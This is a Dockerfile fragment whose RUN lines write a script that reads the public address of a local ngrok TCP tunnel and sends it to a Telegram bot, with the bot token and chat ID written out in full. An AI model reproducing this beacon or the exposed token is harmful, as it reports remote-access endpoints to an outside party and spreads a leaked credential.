...
RUN echo 'laz = (curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"tcp:..([^"]*).*/\1/p')' >> /1.sh
RUN echo 'curl "https://api.telegram.org/bot5663284770:AAHls-QSDcYdukTjbq3KrtZMo09ogWlSsxk/sendMessage?chat_id=1320233599&text=$$laz" &&' >>/1.sh
